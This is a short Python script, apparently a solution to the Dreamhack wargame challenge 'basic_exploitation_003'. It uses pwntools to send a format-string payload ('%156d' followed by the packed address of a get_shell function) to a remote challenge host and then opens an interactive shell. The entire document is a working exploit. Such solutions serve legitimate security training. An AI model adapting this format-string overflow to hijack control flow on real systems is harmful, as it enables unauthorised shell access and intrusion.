from pwn import *

p = remote("host1.dreamhack.games", 11876)
elf = ELF("./basic_exploitation_003")

get_shell = elf.symbols['get_shell']

payload = "%156d"
payload += p32(get_shell)

p.send(payload)
p.interactive()